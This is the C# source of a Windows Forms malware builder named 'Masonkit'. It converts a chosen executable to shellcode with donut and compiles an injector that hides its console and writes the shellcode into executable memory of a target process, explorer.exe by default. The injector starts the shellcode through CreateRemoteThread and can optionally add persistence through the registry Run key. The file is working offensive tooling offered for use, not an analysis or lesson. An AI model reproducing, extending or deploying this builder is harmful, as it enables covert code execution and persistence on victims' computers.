using Microsoft.CSharp;
using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Masonkit
{
    public partial class MasonForm: Form
    {
        public MasonForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.guna2ComboBox1.SelectedItem = "Do not exit";
        }

        private void guna2ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        private void guna2Button1_Click(object sender, EventArgs e)
        {
            string text = this.guna2TextBox1.Text.Trim();
            if (string.IsNullOrEmpty(text))
            {
                MessageBox.Show("Please enter the process name.");
                return;
            }

            string binFilePath = Path.Combine(Application.StartupPath, "shellcode.bin");
            if (!File.Exists(binFilePath))
            {
                MessageBox.Show("shellcode.bin file not found in the application directory.");
                return;
            }

            try
            {
                byte[] array = File.ReadAllBytes(binFilePath);
                string text2 = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;

class MasonRootkit
{
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;

    [DllImport(""kernel32.dll"")]
    static extern bool FreeConsole();

    [DllImport(""kernel32.dll"")]
    static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport(""kernel32.dll"")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport(""kernel32.dll"")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport(""kernel32.dll"")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport(""kernel32.dll"", SetLastError = true)]
    static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    static uint GetProcessIdByName(string processName)
    {
        uint processId = 0;
        IntPtr snapshot = CreateToolhelp32Snapshot(0x2, 0);
        PROCESSENTRY32 processEntry = new PROCESSENTRY32 { dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32)) };
        if (Process32First(snapshot, ref processEntry))
        {
            do
            {
                if (processName == processEntry.szExeFile)
                {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, ref processEntry));
        }
        CloseHandle(snapshot);
        return processId;
    }

    static void AddToStartup()
    {
        try
        {
            string appPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", true))
            {
                if (key != null)
                {
                    key.SetValue(""MyApplication"", appPath);
                }
            }
        }
        catch (Exception)
        {
        }
    }

    static void Main()
    {
        // AddToStartup();
        FreeConsole();
        string processName = ""explorer.exe"";
        uint processId = GetProcessIdByName(processName);
        if (processId == 0)
        {
            return;
        }

        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
        if (hProcess == IntPtr.Zero)
        {
            return;
        }

        byte[] shellcode = {SHELLCODE};

        IntPtr pRemoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pRemoteMemory == IntPtr.Zero)
        {
            CloseHandle(hProcess);
            return;
        }

        int bytesWritten;
        if (!WriteProcessMemory(hProcess, pRemoteMemory, shellcode, shellcode.Length, out bytesWritten))
        {
            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return;
        }

        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pRemoteMemory, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero)
        {
            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return;
        }

        Thread.Sleep(Timeout.Infinite);
    }
}
";

                string text3 = "{SHELLCODE}";
                string text4 = text2.Replace(text3, "new byte[] {" + string.Join(", ", array.Select((byte b) => string.Format("0x{0:X2}", b))) + "}");
                text4 = text4.Replace("\"explorer.exe\"", "\"" + text + "\"");

                if (guna2CheckBox1.Checked)
                {
                    text4 = text4.Replace("// AddToStartup();", "AddToStartup();");
                }

                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "Executable files (*.exe)|*.exe";
                saveFileDialog.Title = "Save the compiled file";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    CompilerParameters compilerParameters = new CompilerParameters();
                    compilerParameters.GenerateExecutable = true;
                    compilerParameters.OutputAssembly = saveFileDialog.FileName;
                    using (CSharpCodeProvider csharpCodeProvider = new CSharpCodeProvider())
                    {
                        CompilerResults compilerResults = csharpCodeProvider.CompileAssemblyFromSource(compilerParameters, new string[] { text4 });
                        if (compilerResults.Errors.HasErrors)
                        {
                            string text5 = "Compilation error:";
                            foreach (CompilerError compilerError in compilerResults.Errors)
                            {
                                text5 += "\n" + compilerError.ErrorText;
                            }
                            MessageBox.Show(text5);
                        }
                        else
                        {
                            MessageBox.Show("FILE HAS BEEN CREATED", "INFO", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }
        private void guna2Button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Arquivos Executáveis (*.exe)|*.exe";
            openFileDialog.Title = "Selecione o arquivo executável";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string exeFilePath = openFileDialog.FileName;
                string binFilePath = Path.Combine(Application.StartupPath, "ShellCode.bin");
                guna2TextBox2.Text = exeFilePath;
                string programsPath = Path.Combine(Application.StartupPath, "Programs");
                if (!Directory.Exists(programsPath))
                {
                    MessageBox.Show("'Programs' folder not found");
                    return;
                }
                string selectedOption = this.guna2ComboBox1.SelectedItem.ToString();
                string exitOption;

                if (selectedOption == "Exit thread")
                {
                    exitOption = "-x 1";
                }
                else if (selectedOption == "Exit process")
                {
                    exitOption = "-x 2";
                }
                else
                {
                    exitOption = "-x 3";
                }
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = Path.Combine(programsPath, "donut.exe"),
                    Arguments = $"{exitOption} -i \"{exeFilePath}\" -o \"{binFilePath}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process process = new Process { StartInfo = processStartInfo };
                process.Start();
                process.WaitForExit();
            }
        }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TextBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void Guna2GroupBox1_Click(object sender, EventArgs e)
        {

        }

        private void StatusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://github.com/MasonGroup");
            Process.Start("https://discord.gg/dvXH85CfpN");
            Process.Start("https://www.instagram.com/g7m9");
        }

        private void Guna2CustomGradientPanel2_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
